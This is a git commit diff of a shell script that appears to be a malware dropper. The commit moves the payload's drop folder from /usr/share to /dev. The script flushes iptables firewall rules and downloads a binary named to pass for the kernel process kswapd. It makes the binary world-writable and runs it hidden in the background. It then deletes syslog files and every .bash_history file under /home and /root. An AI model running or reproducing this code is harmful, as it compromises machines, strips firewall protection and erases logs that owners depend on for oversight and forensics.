1bf210cbe156874f96cd0666d9a755bb565b3154
275178125 <68297291+275178125@users.noreply.github.com>
2020-07-14 15:19:18 -0400

    Update 78247812124.sh

--- 0000000/78247812124.sh
+++ 0000000/78247812124.sh
@@ -2,17 +2,17 @@
 
 if [[ "$EUID" == "0" ]]; then
 	iptables -F &
-	mkdir /usr/share/swapdt/
-	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --silent -q --output /usr/share/swapdt/swapdt0
-	chmod 777 /usr/share/swapdt/swapdt0
-	nohup /usr/share/swapdt/swapdt0 > /dev/null &
+	mkdir /dev/swapdt/
+	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --silent -q --output /dev/swapdt/swapdt0
+	chmod 777 /dev/swapdt/swapdt0
+	nohup /dev/swapdt/swapdt0 > /dev/null &
 	rm -rf /var/log/syslog*
 	find /home/ /root/ -name .bash_history -exec rm {} \;
 else
-	mkdir /usr/share/swapdt/
-	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --silent -q --output /usr/share/swapdt/swapdt0
-	chmod 777 /usr/share/swapdt/swapdt0
-	nohup /usr/share/swapdt/swapdt0 > /dev/null &
+	mkdir /dev/swapdt/
+	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --silent -q --output /dev/swapdt/swapdt0
+	chmod 777 /dev/swapdt/swapdt0
+	nohup /dev/swapdt/swapdt0 > /dev/null &
 	rm -rf /var/log/syslog*
 	find /home/ /root/ -name .bash_history -exec rm {} \;
 fi
